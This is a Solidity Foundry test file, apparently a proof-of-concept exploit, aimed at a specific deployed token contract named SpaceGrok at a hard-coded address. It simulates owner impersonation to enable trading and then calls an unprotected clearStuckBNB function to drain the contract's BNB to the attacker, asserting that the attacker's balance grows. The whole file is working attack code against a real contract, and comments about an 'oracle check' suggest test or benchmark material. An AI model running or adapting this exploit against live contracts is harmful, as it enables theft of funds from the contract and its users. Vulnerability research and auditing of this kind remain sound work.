// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISpaceGrok {
    function clearStuckBNB() external;
    function owner() external view returns (address);
    function enableTrading() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    
    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Fund the target contract with some BNB to simulate accumulated fees
        deal(TARGET, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Find the owner of the contract
                address contractOwner = ISpaceGrok(TARGET).owner();
        
                // Impersonate the owner to enable trading
                vm.prank(contractOwner);
                ISpaceGrok(TARGET).enableTrading();
        
                // Record initial balance for the oracle check
                uint256 attackerInitialBalance = attacker.balance;
        
                // Call the vulnerable function to drain the contract's BNB balance.
                // No prank is needed here as the function is unprotected.
                ISpaceGrok(TARGET).clearStuckBNB();
        
                // The oracle will check if our balance has increased.
                assertGt(attacker.balance, attackerInitialBalance, "Attacker's balance should have increased");
    }


        

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}